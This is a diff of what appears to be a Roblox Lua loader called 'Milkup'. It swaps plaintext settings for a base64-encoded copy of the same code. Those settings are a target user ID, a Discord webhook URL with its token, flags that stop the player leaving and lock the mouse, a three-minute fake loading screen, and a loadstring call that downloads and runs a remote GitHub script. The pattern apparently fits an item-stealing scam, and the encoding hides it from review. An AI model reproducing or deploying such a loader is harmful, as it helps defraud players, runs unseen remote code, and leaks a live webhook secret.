@@ -1,15 +1,11 @@
-_G.UserID = 4624571355
-_G.Webhook = "https://discord.com/api/webhooks/1103268351930802308/hZQbBdsChzYvT-9DuLBX7SUvkiL-nKJKXQFU3X7S27ztvrtiX7PAXzF6bWHknYrISm83" -- optional delete the whole line if you don't want it
-
-_G.LoadingScreen = true
-_G.AntiLeave = true
-_G.MouseLock = true 
--- set them to false if you don't want them
-
-_G.ScriptName = "Milkup"
-_G.FirstText = "Script Preparing"
-_G.SecondText = "Script Loading..."
-_G.ThirdText = "Almost Done..."
-_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Script.lua", true))()
+X0cuVXNlcklEID0gNDYyNDU3MTM1NQpfRy5XZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20v
+YXBpL3dlYmhvb2tzLzExMDMyNjgzNTE5MzA4MDIzMDgvaFpRYkJkc0Noell2VC05RHVMQlg3U1V2
+a2lMLW5LSktYUUZVM1g3UzI3enR2cnRpWDdQQVh6RjZiV0hrbllySVNtODMiIC0tIG9wdGlvbmFs
+IGRlbGV0ZSB0aGUgd2hvbGUgbGluZSBpZiB5b3UgZG9uJ3Qgd2FudCBpdAoKX0cuTG9hZGluZ1Nj
+cmVlbiA9IHRydWUKX0cuQW50aUxlYXZlID0gdHJ1ZQpfRy5Nb3VzZUxvY2sgPSB0cnVlIAotLSBz
+ZXQgdGhlbSB0byBmYWxzZSBpZiB5b3UgZG9uJ3Qgd2FudCB0aGVtCgpfRy5TY3JpcHROYW1lID0g
+Ik1pbGsgVXAiCl9HLkZpcnN0VGV4dCA9ICJTY3JpcHQgUHJlcGFyaW5nIgpfRy5TZWNvbmRUZXh0
+ID0gIlNjcmlwdCBMb2FkaW5nLi4uIgpfRy5UaGlyZFRleHQgPSAiQWxtb3N0IERvbmUuLi4iCl9H
+LldhaXRpbmdUaW1lID0gMTgwIC0tIGl0J3MgdGhlIHRpbWUgYmV0d2VlbiAwJSBhbmQgMTAwJSBp
+biBzZWNvbmRlcwoKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVz
+ZXJjb250ZW50LmNvbS9rNGZ0dC9SL21haW4vU2NyaXB0Lmx1YSIsIHRydWUpKSgp
